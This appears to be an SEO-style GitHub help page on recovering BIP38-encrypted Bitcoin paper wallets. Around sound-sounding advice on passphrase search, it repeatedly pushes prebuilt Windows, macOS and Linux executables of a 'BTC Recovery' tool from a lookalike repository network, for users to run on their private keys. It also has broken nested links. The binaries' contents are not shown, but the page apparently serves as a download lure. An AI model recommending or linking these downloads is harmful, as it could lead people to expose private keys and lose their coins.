<div align="center">
<img src="assets/banner-article.png" alt="BIP38 encrypted paper wallet recovery">
</div>

# BIP38 encrypted paper wallet recovery

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A BIP38 paper wallet holds one private key, encrypted with a passphrase you chose when you made it. The key is on the paper and the passphrase is in your head, so recovery means searching passphrase candidates locally  -  and it is one address's worth of coins, not a whole wallet.

## You'll see this if

You have a printed or written key that starts with a recognisable prefix, and a passphrase you only partly remember. The distinction from a seed phrase matters: this is a single key, not a wallet.

| What you have | What it is | Where to go |
|---|---|---|
| A printed key beginning with a six-character prefix, plus a passphrase | an encrypted private key | here |
| A key that begins with a 5, K or L and needs no passphrase | an unencrypted key, nothing to recover | sweep it |
| A phrase of words rather than a key | a seed, not a paper key | [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) |
| A paper wallet with a QR code and a passphrase line | same as the first row | here |
| A key whose passphrase is completely forgotten but was short | a candidate search, often small | here |
| A key with no passphrase and no record of the address | sweep and compare balances | here |

## Why it happens

BIP38 wraps a single private key with a passphrase-derived key, so the paper can be handled, photographed and stored without exposing the coins. The encryption is deliberately slow, which is the point: it makes guessing expensive for an attacker and merely tedious for you.

Because it protects one key, a paper wallet has no derivation tree, no accounts and no phrase. That simplifies recovery  -  one target, one candidate list  -  and limits it: recovering a paper wallet returns the coins at that address only, never a whole wallet's history.

The passphrase is the whole security model, and it is also the whole failure mode. Nothing stores it, nothing hints at it, and a forgotten passphrase with a long random value leaves no search space. What makes recovery realistic is the same thing that made it weak: people chose short, patterned passphrases because they had to type them once.

Encrypted keys come in two shapes, and the string itself says which. One wraps the key directly; the other derives a key pair first and stores an encrypted token alongside a small confirmation code for the address. The tool reads the shape from the prefix and from the checksum embedded in the string, so the correct decryption path is chosen rather than guessed  -  which also means a mistyped character fails that checksum before any passphrase is tried, and a failure of that kind says nothing about the passphrase at all. If a search runs for hours and never reports a single candidate, the string is the thing to re-read, not the word list.

## Fix

Confirm the key is encrypted, collect the passphrase candidates, and search locally against the key itself  -  no address is needed, because the key is its own check.

1. **Identify the artifact.** An encrypted key carries a prefix and a checksum embedded in the string; an unencrypted key is shorter and needs no passphrase. Do not type a key into a website to find out which it is: [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md).
2. **Write the key down exactly as printed**, including case, and keep the original as the authority. Transcription errors in a base58 string are fatal and undetectable until decryption fails.
3. **List every passphrase candidate**: words, names, numbers, capitalisation, spaces, punctuation, and whether it was typed on a phone or a laptop.
4. **Build rules rather than guesses**, starting narrow: one word plus one digit pattern, then case variants: [Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md).
5. **Download the current release from the GitHub releases page** and run the decryption offline against the key: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).
6. **Sweep the decrypted key immediately** to a wallet you control, and do it from an offline machine if the balance is meaningful  -  a key that has been typed into any device should be treated as exposed.
7. **Destroy the paper only after the sweep confirms**, and keep a record of the address so a future you knows where the coins went.

## If that did not work

If a search finishes empty, the key transcription is the first suspect, because a single wrong character changes the checksum and defeats every passphrase.

Compare the written key against the original print or a photograph, character by character. Watch for ambiguous glyphs  -  a one and an ell, a zero and an O  -  and for lost case. If the key checks out and the passphrase search still fails, widen in the cheapest direction: add a space, add a trailing digit, test the other case.

Where the passphrase was long and random, there is nothing to enumerate, and the coins at that address stay unspendable. That is a real limit rather than a tooling gap: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md) covers the boundary, and [Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md) covers what else tends to survive from that era.

## Prevention

- Write the passphrase somewhere separate from the paper, and note that the paper is encrypted.
- Prefer a seed-phrase wallet over a single-key paper wallet for anything long-term.
- Verify a sweep works before trusting a paper wallet as storage.
- Keep the paper away from cameras and cloud backups.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### How do I recover a BIP38 paper wallet?

Search passphrase candidates locally against the encrypted key. The key is its own verification: a correct passphrase decrypts it, a wrong one fails, and no address is needed to test.

### Can I recover a paper wallet without the passphrase?

Only by searching candidates. There is no reset and no escrow, and the encryption is designed so that guessing is slow  -  which is why a short remembered passphrase is worth hours and a long random one is worth none.

### Is a paper wallet safer than a seed phrase?

Neither is inherently safer; both fail through loss and mishandling. A paper wallet protects one address and needs its passphrase forever, while a phrase restores everything and is a single high-value secret.

### What if the printed key is damaged?

A single unreadable character cannot be guessed from context, because the string has no redundancy to exploit. Look for a second copy, a photograph taken at creation, or a record of the address to confirm what the key should control.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [A private key is not a seed phrase]([A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md))
- [Token lists and password patterns]([Token lists and password patterns](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/btcrecover-token-list-reference.md))
- [Old wallets and Bitcoin from years ago]([Old wallets and Bitcoin from years ago](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/old-wallet-recovery-with-btcrecover.md))
- [Bitcoin wallet password recovery tool]([Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md))
